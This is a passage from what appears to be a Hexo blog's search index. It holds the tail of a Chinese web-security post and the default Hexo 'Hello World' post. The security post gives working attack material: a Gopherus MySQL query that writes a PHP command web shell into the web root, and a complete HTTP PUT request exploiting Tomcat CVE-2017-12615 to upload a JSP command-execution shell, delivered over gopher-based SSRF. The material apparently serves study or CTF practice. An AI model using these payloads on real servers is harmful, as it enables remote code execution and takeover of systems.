bash">python2.7 gopherus.py --exploit mysql<br>Give MYSQL username:  root<br>Give query to execute:  <span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php system(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> into outfile <span class="hljs-string">&#x27;/var/www/html/cmd.php&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="对tomcat文件写入"><a href="#对tomcat文件写入" class="headerlink" title="对tomcat文件写入"></a>对tomcat文件写入</h3><p>利用Tomcat漏洞，CVE-2017-12615进行任意文件上传</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs jsp">PUT /<span class="hljs-number">1.</span>jsp/ HTTP/<span class="hljs-number">1.1</span><br>HOST: ip:<span class="hljs-number">8080</span><br>Accetp: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: en</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">Content-Length: 532</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;%</span><br><span class="hljs-comment">    String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="hljs-comment">    if(command!=null)&#123;</span><br><span class="hljs-comment">        java.io.InputStream</span><br><span class="hljs-comment">        in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="hljs-comment">        int a=-1;</span><br><span class="hljs-comment">        byte[] b= new byte[2048];</span><br><span class="hljs-comment">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="hljs-comment">        while((a=in.read(b))!=-1)&#123;</span><br><span class="hljs-comment">            out.println(new String(b));</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    else&#123;</span><br><span class="hljs-comment">         out.print(&quot;format: xxx.jsp?cmd=Command&quot;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">%&gt;</span><br></code></pre></td></tr></table></figure><p>利用gopher，然后burp两次URL编码后提交</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/03/22/hello-world/"/>
    <url>/2025/03/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
